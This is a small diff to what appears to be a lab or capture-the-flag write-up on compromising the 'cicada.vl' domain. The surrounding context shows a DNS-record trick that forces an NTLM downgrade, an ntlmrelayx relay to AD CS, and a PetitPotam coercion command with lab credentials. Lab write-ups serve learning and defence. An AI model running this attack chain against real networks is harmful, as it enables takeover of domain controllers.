@@ -200,7 +200,7 @@ The catch here is that this domain enforces Kerberos and rejects NTLM (`NTLM:Fal
 
 ### The trick: forcing an NTLM downgrade via a crafted DNS record
 
-Windows builds the SPN for an outgoing authentication from the resolved DNS name, using an API called `CredMarshalTargetInfo`. That API also allows Base64-encoded "target info" to be appended to the DNS/SPN name it receives. If a **DNS record is registered whose name is the target hostname with an empty/garbage `CREDENTIAL_TARGET_INFORMATION` blob appended to it**, Windows fails to unmarshal a usable SPN from that name and silently falls back to NTLM instead of Kerberos for that one authentication attempt. This is a known DNS-poisoning technique for forcing NTLM relay even in Kerberos-enforced environments (see references).
+Windows builds the SPN for an outgoing authentication from the resolved DNS name, using an API called `CredMarshalTargetInfo`. That API also allows Base64-encoded "target info" to be appended to the DNS/SPN name it receives. If a **DNS record is registered whose name is the target hostname with an empty/garbage `CREDENTIAL_TARGET_INFORMATION` blob appended to it**, Windows fails to find a usable SPN from that name and silently falls back to NTLM instead of Kerberos for that one authentication attempt. This is a known DNS-poisoning technique for forcing NTLM relay even in Kerberos-enforced environments (see references).
 
 The minimal blob needed is `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`, so the record to add is:
 
@@ -228,7 +228,7 @@ impacket-ntlmrelayx -smb2support --target 'http://DC-JPQ225.cicada.vl/certsrv/ce
   --adcs --template DomainController
 ```
 
-The DC is then coerced (via PetitPotam / `EfsRpcAddUsersToFile`) into authenticating back to the crafted DNS record — which, thanks to the trick above, makes it use NTLM instead of Kerberos:
+The DC is then coerced (via PetitPotam / `EfsRpcAddUsersToFile`) into authenticating back to the crafted DNS record, which, thanks to the trick above, makes it use NTLM instead of Kerberos:
 
 ```
 netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k \
